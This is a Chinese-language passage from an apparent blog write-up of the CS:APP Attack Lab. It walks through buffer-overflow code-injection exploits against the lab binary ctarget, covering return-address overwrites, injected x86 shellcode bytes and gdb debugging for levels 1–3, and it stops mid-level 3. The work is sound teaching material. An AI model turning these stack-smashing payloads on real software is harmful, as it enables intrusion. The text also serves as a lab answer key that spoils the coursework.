<li>farm.c 目标程序的”Gadget Farm”的源代码，你将利用这些代码去生成返回导向编程攻击</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>答案不能使用攻击去避免程序的正确性检查代码。具体来说，ret指令返回的目的地只能是以下3种：</p>
<ul>
<li>函数touch1, touch2, touch3的地址</li>
<li>攻击注入代码的地址</li>
<li>gadget farm中gadgets的地址</li>
</ul>
<p>rtarget中只能用函数start_farm和函数end_farm之间的函数来生成gadget。</p>
<h2 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h2><p>目标程序ctarget和rtarget都使用getbuf函数从标准输入流中读取字符串，getbuf函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">	Gets(buf);</div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Gets函数同标准库函数gets相似，其从标准输入流中读入以’\n’或者是EOF结尾的字符串并且将其存储在制定的地址。在这段代码中，目标地址是一个长BUFFER_SIZE的字符数组。<br>但同时Gets()和gets()都不具备检测目的缓冲区是否足够大以存储输入的字符串的功能，因此可能存在缓冲区溢出的风险。在本次实验中，我们要利用该缓冲区溢出漏洞，改变目标程序的行为。</p>
<p>对于自学者来说，运行target的程序的时候需要带上参数-q以避免其连接并不存在的计分服务器。同时需要注意，用来生成攻击字符串的16进制的代码的任意中间位置都不能包含0a，因为其ascii表示是’\n’，在其之后的任意代码都不会被目标程序读入了。</p>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="第1部分-代码注入（Code-Injection）攻击"><a href="#第1部分-代码注入（Code-Injection）攻击" class="headerlink" title="第1部分 代码注入（Code Injection）攻击"></a>第1部分 代码注入（Code Injection）攻击</h3><p>本部分总共包含3个阶段，需要生成相应的攻击字符串去攻击ctarget。目标文件ctarget的栈位置是固定的，并且栈上的代码可执行。这为我们的代码注入攻击提供了机会。</p>
<h4 id="等级1"><a href="#等级1" class="headerlink" title="等级1"></a>等级1</h4><p>阶段一不需要注入自己的代码，攻击字符串只需要将程序重定向至已有的过程即可。</p>
<p>在ctarget中，函数getbuf被test函数调用，而test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> val;</div><div class="line">	val = getbuf();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>现在我们需要修改程序的行为，让程序从getbuf返回时不返回到test函数中，而跳转至touch1函数。函数touch1如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">1</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</div><div class="line">	validate(<span class="number">1</span>);</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先，我们对于目标可执行程序ctarget使用objdump -d ctarget &gt; ctarget-disassemble生成ctarget的反汇编代码。然后观察反汇编代码中的getbuf函数，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00000000004017a8 &lt;getbuf&gt;:</div><div class="line">  4017a8:       48 83 ec 28             sub    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</div><div class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</div><div class="line">  4017b4:       b8 01 00 00 00          mov    <span class="variable">$0x1</span>,%eax</div><div class="line">  4017b9:       48 83 c4 28             add    <span class="variable">$0x28</span>,%rsp</div><div class="line">  4017bd:       c3                      retq   </div><div class="line">  4017be:       90                      nop</div><div class="line">  4017bf:       90                      nop</div></pre></td></tr></table></figure></p>
<p>通过观察sub $0x28,%rsp可以知道，getbuf在局部栈上开辟了大小为40个字节的空间，据此我们可以推测BUFFER_SIZE为40。那么，如果我们输入的字符串长度超过了40个字节，就会造成缓冲区溢出。</p>
<p>这里我们需要复习一下函数栈帧的相关知识。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。</p>
<p>对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。因此，直接使用touch1的起始地址作为溢出的字符串覆盖返回地址即可。</p>
<p>我们观察反汇编代码中touch1函数的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017c0 &lt;touch1&gt;:</div></pre></td></tr></table></figure><br>据此可以得出攻击代码的16位表示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">c0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>其中，前40个字节的内容无关紧要（只要不是0a即可），因为它们属于未溢出的部分。这段攻击代码中而真正起作用的是缓冲区溢出的部分，即最后的8个字节。同时要注意到x86_86的机器是小端表示的字节序，即低位放在低字节，高位放在高字节，并且栈的增长方向是由低地址增长到高地址。所以最后8个字节的顺序为 c0 17 40 00 00 00 00 00。<br>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level1/level1.txt|./hex2raw|./ctarget -q</div><div class="line">数Cookie: 0x59b997fa</div><div class="line">Type string:Touch1!: You called touch1()</div><div class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级2"><a href="#等级2" class="headerlink" title="等级2"></a>等级2</h4><p>阶段2需要在攻击字符串中注入少量的代码。</p>
<p>在ctarget中，函数touch2如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">2</span>;</div><div class="line">	<span class="keyword">if</span> (val == cookie) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		validate(<span class="number">2</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: you called touch2(0x%.8x)\n"</span>, val);</div><div class="line">		fail(<span class="number">2</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让ctarget执行函数touch2的代码而不是直接返回到test函数。并且，你必须假装你已经传递了cookie的值作为touch2的参数。</p>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。</p>
<p>同阶段一相似，攻击代码的前40个字节无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，为了让函数能返回到栈上执行代码，我们需要知道栈地址。</p>
<p>使用gdb加载ctarget，并为getbuf函数设置断点，执行程序，当程序因为断点而暂停的时候打印rsp的值。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$rsp</span></div><div class="line"><span class="variable">$1</span> = 0x5561dca0</div></pre></td></tr></table></figure><br>从中可以得出结论，ctarget在执行getbuf时的栈地址（指向返回地址）为0x5561dca0。因此我们应该将返回地址指定为0x5561dca8。</p>
<p>然后我们用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi <span class="comment">;设置cookie为参数</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch2的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>其中add $16,%rsp的值可能需要修改，这是因为我们无法确定这段汇编代码反汇编后占多少字节。同时，我们也要保证rsp移动的位数是8的倍数，这是栈的特性（即push和pop时操作数据的大小为一个机器字长）决定的。</p>
<p>写完了攻击代码后，我们依次使用<code>gcc -c exploit.s</code>以及<code>objdump -d exploit.o &gt; exploit.d</code>将攻击代码汇编和反汇编。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; cat exploit.d                                                 </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf fa 97 b9 59       	mov    <span class="variable">$0x59b997fa</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure><br>总共是10个字节，小于16个字节，因此源攻击代码中的add $16,%rsp可以直接使用，无需继续更改。<br>最后我们在ctarget-disassemble中观察函数touch2的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00000000004017ec &lt;touch2&gt;:</div></pre></td></tr></table></figure></p>
<p>根据以上的信息，我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf fa 97 b9 59 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 */</div><div class="line">ec 17 40 00 00 00 00 00 /* 返回地址 指向函数touch2 */</div></pre></td></tr></table></figure><br>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level2/level2.txt|./hex2raw|./ctarget -q     </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3"><a href="#等级3" class="headerlink" title="等级3"></a>等级3</h4><p>阶段3同样包含了代码注入攻击，但是这次需要将一个字符串作为参数传入。<br>在ctarget中，函数hexmatch和touch3的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</div><div class="line">	<span class="comment">/* Make position of check string unpredictable */</span></div><div class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</div><div class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</div><div class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></div><div class="line">&#123;</div><div class="line">	vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></div><div class="line">	<span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		validate(<span class="number">3</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</div><div class="line">		fail(<span class="number">3</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>任务是让程序执行touch3的代码而不是直接返回到test，你必须假装你已经将一个cookie的字符串表示作为参数传递给了touch3。</p>
<p>该阶段的思路同阶段二相似，不同的是，阶段二要求传递的参数是一个数字，而阶段三要求传递的参数是一个自己构造的字符串的首地址。因此，我们需要将目标字符串也通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为%rdi。</p>
<p>现在我们来构造攻击字符串，首先，同阶段一和阶段二一样，攻击字符串的前40个字符串无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，同阶段二一样，我们将该返回地址设置为0x5561dca8。</p>
<p>接下来我们使用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x0, %edi <span class="comment">;设置第一个参数指向一个字符串（保留）</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch3的地址）</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure><br>注意，在构造该攻击字符串的时候，我们还不知道cookie的字符串的表示的首地址。故我们先使用0x0进行占位。生成最后的攻击字符串时只要用相应的栈地址替换0x0即可。</p>
<p>写完攻击代码之后，我们依次使用gcc和objdump进行汇编和反汇编，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; gcc -c exploit.s                                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; objdump -d exploit.o &gt; exploit.d                             </div><div class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; cat exploit.d                                                </div><div class="line"></div><div class="line">exploit.o：     文件格式 elf64-x86-64</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">0000000000000000 &lt;.text&gt;:</div><div class="line">   0:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</div><div class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</div><div class="line">   9:	c3                   	retq   </div></pre></td></tr></table></figure></p>
<p>在攻击代码之后，栈上紧跟着的应该是该攻击代码的返回地址，毫无疑问，在这里我们需要将返回地址指向函数touch3的起始地址。</p>
<p>现在需要讨论的问题是，字符串应该放在栈上的什么地方？首先我们可以考虑将字符串放置在攻击字符串的前40个字节中。这样，具体的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">35 39 62 39 39 37 66 61</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 其中最后16个字节保存了cookie的字符串表示 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf 90 dc 61 55 48 83 c4 /* 攻击代码 其中将%rdi指向cookie的字符串表示的首地址 */</div><div class="line">10 c3 00 00 00 00 00 00</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div></pre></td></tr></table></figure><br>下面我们用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Misfire: You called touch3(<span class="string">""</span>)</div><div class="line">FAIL: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:FAIL:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 A8 DC 61 55 00 00 00 00 BF 90 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>糟糕，程序出错了，从Misfire: You called touch3(“”)中我们可以看出，%rdi指向的字符串是空字符串。这显然与我们的预期不符。我们的攻击代码理应没有任何问题。那么问题出在哪儿呢？</p>
<p>下面我们将攻击字符串导出成文件并且在gdb中进行调试，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3-2.txt|./hex2raw &gt; weirdError</div><div class="line">user@BlackDragon ~/C/A/target1&gt; gdb ctarget                 </div><div class="line">GNU gdb (GDB) 7.12.1</div><div class="line">Copyright (C) 2017 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></div><div class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</div><div class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</div><div class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</div><div class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</div><div class="line">Reading symbols from ctarget...done.</div><div class="line">(gdb) <span class="built_in">break</span> getbuf</div><div class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</div><div class="line">(gdb) run -i weirdError -q</div><div class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -i weirdError -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line"></div><div class="line">Breakpoint 1, getbuf () at buf.c:12</div><div class="line">12	buf.c: 没有那个文件或目录.</div><div class="line">(gdb) nexti 5</div><div class="line">0x00000000004017bd	16	<span class="keyword">in</span> buf.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">......After Some Steps......</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> touch3:</div><div class="line">   0x00000000004018fa &lt;+0&gt;:	push   %rbx</div><div class="line">   0x00000000004018fb &lt;+1&gt;:	mov    %rdi,%rbx</div><div class="line">   0x00000000004018fe &lt;+4&gt;:	movl   <span class="variable">$0x3</span>,0x202bd4(%rip)        <span class="comment"># 0x6044dc &lt;vlevel&gt;</span></div><div class="line">   0x0000000000401908 &lt;+14&gt;:	mov    %rdi,%rsi</div><div class="line">   0x000000000040190b &lt;+17&gt;:	mov    0x202bd3(%rip),%edi        <span class="comment"># 0x6044e4 &lt;cookie&gt;</span></div><div class="line">=&gt; 0x0000000000401911 &lt;+23&gt;:	callq  0x40184c &lt;hexmatch&gt;</div><div class="line">   0x0000000000401916 &lt;+28&gt;:	<span class="built_in">test</span>   %eax,%eax</div><div class="line">   0x0000000000401918 &lt;+30&gt;:	je     0x40193d &lt;touch3+67&gt;</div><div class="line">   0x000000000040191a &lt;+32&gt;:	mov    %rbx,%rdx</div><div class="line">   0x000000000040191d &lt;+35&gt;:	mov    <span class="variable">$0x403138</span>,%esi</div><div class="line">   0x0000000000401922 &lt;+40&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x0000000000401927 &lt;+45&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   0x000000000040192c &lt;+50&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</div><div class="line">   0x0000000000401931 &lt;+55&gt;:	mov    <span class="variable">$0x3</span>,%edi</div><div class="line">   0x0000000000401936 &lt;+60&gt;:	callq  0x401c8d &lt;validate&gt;</div><div class="line">   0x000000000040193b &lt;+65&gt;:	jmp    0x40195e &lt;touch3+100&gt;</div><div class="line">   0x000000000040193d &lt;+67&gt;:	mov    %rbx,%rdx</div><div class="line">   0x0000000000401940 &lt;+70&gt;:	mov    <span class="variable">$0x403160</span>,%esi</div><div class="line">   0x0000000000401945 &lt;+75&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x000000000040194a &lt;+80&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">(gdb) nexti</div><div class="line">0x0000000000401916	73	<span class="keyword">in</span> visible.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	0	-98	119	-23	120	13	-32	-89</div><div class="line">0x5561dc98:	-112	-36	97	85	0	0	0	0</div></pre></td></tr></table></figure><br>我们可以注意到，在函数touch3调用函数hexmatch的前后，0x5561dc90指向的内存并不是我们一开始注入的cookie的字符串表示，而是被填充了其他的数据。这是由于调用新的函数（hexmatch以及hexmatch调用的函数）使得栈帧继续向下增长，从而覆盖了原先我们注入的数据的原因。</p>
<p>我们可以在gdb中实际的运行一下ctarget来得出执行hexmatch函数到底会覆盖多少栈空间，然后根据结果重写我们的攻击代码。<br>但是我在这里采用了另外一种方法是直接将cookie的字符串表示写到攻击代码的最后，这样，这段字符串将会处于相对的高地址，由于栈的增长方向是从高地址到低地址，这样，注入的字符串将绝对不会因函数调用而被覆盖。</p>
